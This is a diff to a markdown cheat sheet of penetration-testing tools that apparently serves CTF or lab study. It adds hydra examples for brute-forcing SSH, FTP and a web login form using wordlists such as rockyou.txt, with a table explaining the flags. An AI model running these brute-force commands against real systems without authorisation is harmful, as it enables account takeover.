@@ -103,8 +103,23 @@ _-a 0_ --> Attack type: Dictionary (disctionary file is **rockyou.txt**)
 
 ## hydra
 
-Usage: `hydra -l <username> -P <password list> <target>`
-Example: `hydra -l Root -P /usr/share/wordlists/rockyou.txt ssh://10.10.123.55`
+Usage: `hydra -l <username> -P <password list> <target> [-t <number of threads>]`
+Example1: `hydra -l Root -P /usr/share/wordlists/rockyou.txt ssh://10.10.123.55`
+Example2: `hydra -l username -P passlist.txt ftp://10.10.95.142`
+Example3: `hydra -l username -P passlist.txt 10.10.95.142 -t 4 ssh`
+
+To bruteforce a web form go to the browser **developer tools/network** tab and check the request method (usually GET or POST).
+Example4: `hydra -l username -P passlist.txt 10.10.95.142 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V`
+|---|---|
+| -L | User name |
+| -P | Password list |
+| IP address | target computer or service |
+| http-post-form | tells it is a POST request |
+| /login:username...&password... | the form url (http://10.10.10.10/login) and the names of the  login and pass variables |
+| ^USER^ ^PASS^ | tells that where to append the user and password (the actual values come from -L and -P) |
+| F=incorrect | Failed login if the answer contains "incorrect" |
+| -V | verbose log |
+|---|---|
 
 ## john the ripper
 
